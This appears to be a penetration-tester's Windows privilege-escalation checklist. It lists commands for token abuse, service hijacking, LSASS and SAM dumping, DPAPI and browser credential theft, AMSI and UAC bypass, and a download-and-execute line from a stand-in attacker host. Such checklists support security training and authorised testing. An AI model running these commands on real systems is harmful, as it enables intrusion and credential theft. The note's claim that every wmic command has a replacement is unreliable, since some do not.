+++
title = 'Windows Privilege Escalation Checklist'
date = 2026-10-30
type = 'notes'
weight = 80
toc = true
task = true
tags = ['windows', 'privilege-escalation', 'checklist']
+++

> Working document — tick as you go. Commands are abbreviated; full detail is in the matching section of the notes.
> **Stop at the first successful path.** Token privileges and service misconfigurations are faster and safer than kernel exploits. Kernel exploits last.
> **CVE numbers are hints, not gospel** — verify the version against the current NVD before committing to a CVE-specific path.

**Target context — fill before starting:**

| Field | Value |
|---|---|
| Hostname | |
| OS / build (`systeminfo`) | |
| Architecture | |
| Current user / groups (`whoami /all`) | |
| Integrity level (Medium / High) | |
| Token privileges (`whoami /priv`) | |
| Domain-joined? | |
| AV / EDR present? | |
| WMIC available? (24H2+ removes it) | |
| Notes | |

---

### Phase 0 — Orient (60 seconds)

- [ ] `whoami /all` — user, groups, SID, **integrity level**
- [ ] `whoami /priv` — **the single highest-value command**; an enabled `SeImpersonate`, `SeBackup`, or `SeDebug` is often an instant win[reference:1]
- [ ] `whoami /groups | findstr /i "Mandatory"` — `Medium` + `Administrators` = **UAC is the only barrier**
- [ ] `hostname; systeminfo` — OS build, patches, hotfixes
- [ ] `net config workstation` — domain membership
- [ ] `ipconfig /all; route print; arp -a` — network position
- [ ] `echo %USERNAME%` — confirm the current context
- [ ] Record findings above, then proceed

---

### Phase 1 — Automated Triage (run once, verify by hand)

- [ ] `winPEASx64.exe quiet` — broad enumeration; focus on **red + yellow** findings
- [ ] `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"`[reference:2]
- [ ] `SharpUp.exe audit` — C# equivalent; separates **service binary** and **service DACL** findings
- [ ] `Seatbelt.exe -group=all` — host survey
- [ ] **Verify every hit by hand** — automated tools produce false positives

> **AMSI note:** if PowerShell-based tools are blocked, bypass AMSI first or use the C#/binary alternatives (SharpUp, Seatbelt, WinPEAS).

---

### Phase 2 — Token Privileges (highest payoff, 30 seconds)

- [ ] `whoami /priv` — read the **entire** list, not just the first few
- [ ] `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` → **Potato attack** (SigmaPotato, GodPotato, PrintSpoofer)
- [ ] `SeDebugPrivilege` → **LSASS dump** (PPLdump, WerFaultSecure, AxiomDumper) — check `RunAsPPL` first
- [ ] `SeBackupPrivilege` → `reg save` SAM/SYSTEM/SECURITY, or `diskshadow` + `robocopy /B` for NTDS.dit
- [ ] `SeRestorePrivilege` → **one-step arbitrary write** — overwrite a SYSTEM service binary or `utilman.exe`
- [ ] `SeTakeOwnershipPrivilege` → `takeown` + `icacls` → replace a SYSTEM-executed binary
- [ ] `SeLoadDriverPrivilege` → BYOVD (EoPLoadDriver + Capcom.sys / Silver Fox)
- [ ] **Filtered token?** `FullPowers.exe -c "cmd /c whoami /priv" -z` to recover the default service-account privileges

> **Disabled ≠ unavailable.** All of these can be enabled at runtime; exploitation tools do this automatically.

---

### Phase 3 — Service & Registry Misconfigurations

**Writable service binary (file-system ACL)**

- [ ] `icacls "C:\path\to\service.exe"` — look for `(F)`, `(M)`, `(W)` on `Users` / `Authenticated Users` / your user
- [ ] `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """` — enumerate auto-start services
- [ ] Replace binary → `sc stop` / `sc start` (error 1053 is **expected** — the payload still ran)

**Modifiable service DACL**

- [ ] `accesschk.exe /accepteula -uwcqv "Users" *` (also `"Authenticated Users"`, `"Everyone"`, `%USERNAME%`)
- [ ] `SERVICE_CHANGE_CONFIG` / `SERVICE_ALL_ACCESS` → `sc config <svc> binPath= "cmd /c ..."` (space after `=` is mandatory)
- [ ] `WRITE_DAC` alone → rewrite the service ACL to grant yourself `SERVICE_CHANGE_CONFIG`

**Writable registry key (`ImagePath` / `ServiceDll`)**

- [ ] `accesschk.exe /accepteula -kvuqsw hklm\System\CurrentControlSet\services`
- [ ] `Set-ItemProperty ... ImagePath` → `sc stop/start`

**Unquoted service path**

- [ ] `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`
- [ ] `Get-UnquotedService` (PowerUp)
- [ ] Check `icacls` on every **intermediate directory** — drop `Program.exe` / `My.exe` if writable

**DLL hijacking (phantom / writable-directory)**

- [ ] Procmon — filter on the service process, `NAME NOT FOUND` for a DLL
- [ ] Check service install directories for writable ACLs
- [ ] Check **Machine PATH** for writable directories (primitive, not proof — confirm with Procmon)

**AlwaysInstallElevated**

- [ ] `reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- [ ] `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- [ ] **Both** must be `0x1` → `msiexec /quiet /qn /i shell.msi`

---

### Phase 4 — Credentials (often the fastest lateral / root path)

**Files and histories**

- [ ] `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`
- [ ] `dir /S /B *pass*.txt *pass*.xml *pass*.ini *cred* *vnc* *.config* 2>nul`
- [ ] `gc (Get-PSReadLineOption).HistorySavePath` — PowerShell history
- [ ] `foreach($u in ((ls C:\users).fullname)){cat "$u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`
- [ ] Unattend files: `findstr /S /I cpassword \\sysvol\*.xml` → `gpp-decrypt` (not hashcat)

**Saved credentials and DPAPI**

- [ ] `cmdkey /list` — Credential Manager
- [ ] `SharpDPAPI.exe triage` — credentials, vaults, RDP, browser, certificates
- [ ] `SharpChrome.exe logins /unprotect`
- [ ] `netsh wlan show profile WIFINAME key=clear`
- [ ] **DPAPI storage paths:**
  - `%APPDATA%\Microsoft\Credentials\`
  - `%APPDATA%\Microsoft\Protect\<SID>\` (masterkeys)
  - `%LOCALAPPDATA%\Microsoft\Vault\`
  - `%ProgramData%\Microsoft\Vault\`

**Registry secrets**

- [ ] `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` — `AutoAdminLogon`, `DefaultPassword`
- [ ] `reg query HKCU\Software\SimonTatham\PuTTY\Sessions\` — PuTTY clear-text credentials
- [ ] `reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v Password`

**LSASS and hives**

- [ ] `procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp` → `pypykatz lsa minidump`
- [ ] `rundll32 C:\Windows\System32\comsvcs.dll,MiniDump <pid> C:\Temp\lsass.dmp full` (built-in)
- [ ] `reg save hklm\sam C:\Temp\sam.save` + `system.save` + `security.save` → `impacket-secretsdump -sam ... LOCAL`
- [ ] **Check `RunAsPPL` first:** `reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL` — if `1`, `procdump` fails; use PPLdump / WerFaultSecure / AxiomDumper

**Other sources**

- [ ] KeePass `.kdbx` → `keepass2john` + `hashcat -m 13400`
- [ ] Sticky Notes: `...\Microsoft.MicrosoftStickyNotes_...\LocalState\plum.sqlite`
- [ ] Alternate data streams: `dir /R` → `Get-Content -Stream` or `more < file.txt:secret`

---

### Phase 5 — Session, Process, and Token Attacks

- [ ] `whoami /groups | findstr "Mandatory"` — `Medium` + `Administrators` → **UAC bypass** (FODHelper, ICMLuaUtil COM)
- [ ] **Saved credentials without password:** `runas /savecred` → launch a reverse shell without knowing the password
- [ ] **Named pipes:** `pipelist.exe /accepteula` — Potato coercion surface
- [ ] **Privileged groups:** `whoami /groups` — Backup Operators, Server Operators, DnsAdmins, Print Operators, Hyper-V Administrators, Account Operators, Network Configuration Operators, Cryptographic Operators
- [ ] **Token theft via `SeDebug`:** inject into `winlogon.exe` / `lsass.exe` (psgetsys / `ImpersonateFromParentPid`)
- [ ] **Open handles:** `handle.exe` / `accesschk` — writable handle to a privileged file or registry key

---

### Phase 6 — Scheduled Tasks and Startup

- [ ] `schtasks /query /fo LIST /v` — look for **writable Action binaries**
- [ ] `Get-ScheduledTask | select TaskName,State`
- [ ] `Get-Acl C:\Windows\System32\Tasks\<TaskName>` — who can modify the **task file**
- [ ] `icacls "C:\path\to\action.exe"` — who can modify the **binary the task runs**
- [ ] Startup folders: `shell:startup`, `shell:common startup`
- [ ] Autoruns: `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` / `RunOnce` / `Wow6432Node`

---

### Phase 7 — UAC and Integrity Level

- [ ] `whoami /groups` — `Medium Mandatory Level` + `Administrators` = UAC is the barrier
- [ ] `REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin`
- [ ] `REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`
- [ ] **FODHelper / ComputerDefaults** — `HKCU\Software\Classes\ms-settings\Shell\Open\command`
- [ ] **EventVWR** — `HKCU\Software\Classes\mscfile\shell\open\command`
- [ ] **ICMLuaUtil COM** (CMSTPLUA) — the dominant 2025–2026 technique; no registry artifact
- [ ] **Check Administrator Protection status** on Windows 11 25H2+ (currently disabled by default)
- [ ] Clean up the registry key after the payload fires

---

### Phase 8 — Kernel and Patch Level (last resort)

- [ ] `systeminfo` → `wesng` / `Watson` / `windows-exploit-suggester`
- [ ] `wmic qfe` (pre-24H2) or `Get-HotFix`
- [ ] **WMIC is removed on 24H2/25H2** — use `Get-CimInstance` / `Get-HotFix` instead
- [ ] Known 2025–2026 kernel LPE families: heap overflow, UAF, race condition, integer overflow in `Win32k` / Secure Kernel
- [ ] Keep a fallback shell; kernel exploits can BSOD
- [ ] Prefer **token / service / credential** paths — kernel exploits are the last resort

---

### Phase 9 — Domain and AD CS (if domain-joined)

- [ ] `certipy find -u user@domain -p 'Pass' -dc-ip DC_IP -vulnerable` — **ESC1–ESC17**
- [ ] `Get-ADComputer -Filter {TrustedForDelegation -eq $true}` — unconstrained delegation
- [ ] `Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"}` — constrained delegation
- [ ] **RBCD:** write access over a computer object → `rbcd.py` → impersonate any user
- [ ] **LAPS:** `ReadProperty` on `ms-Mcs-AdmPwd` / `msLAPS-Password` → local admin password
- [ ] **WSUS:** `reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer` → SharpWSUS
- [ ] **GPP `cpassword`:** SYSVOL `Groups.xml` → `gpp-decrypt`

---

### Stop Conditions

- [ ] SYSTEM / Administrator obtained → **stop enumerating, record the path, screenshot / copy flags**
- [ ] Two full passes with no lead → re-read `whoami /priv`, service DACLs, `cmdkey /list`, **process environments**, and **scheduled-task Action binaries** — these are the most-missed
- [ ] If time-boxed and stuck → pivot to network enumeration; a lateral host may be easier
- [ ] If kernel exploit is the only path left → confirm architecture, keep a fallback shell, and choose a deterministic bug over a race
---

**A few notes on the 2025–2026 additions:**

- **`whoami /priv` is deliberately first** — an enabled `SeImpersonate`, `SeBackup`, or `SeDebug` is often an instant win, and this is the single highest-value command after landing a shell.
- **WMIC removal is real.** `wmic` is gone from Windows 11 24H2 and 25H2 (and beta builds) as of August 2026. Every `wmic` command in the checklist is paired with a `Get-CimInstance` / `Get-HotFix` replacement.
- **ICMLuaUtil is the dominant UAC bypass** in 2026 malware (AvisLoader, LunexLoader, CrySome RAT) — it avoids the signatured `ms-settings` registry keys.
- **DPAPI is a first-class credential source**, not an afterthought. `SharpDPAPI.exe triage` on a user profile frequently recovers saved RDP or domain credentials that are more valuable than a local admin.
- **Kernel exploits are last** — token, service, and credential paths are faster, more reliable, and do not risk a BSOD.
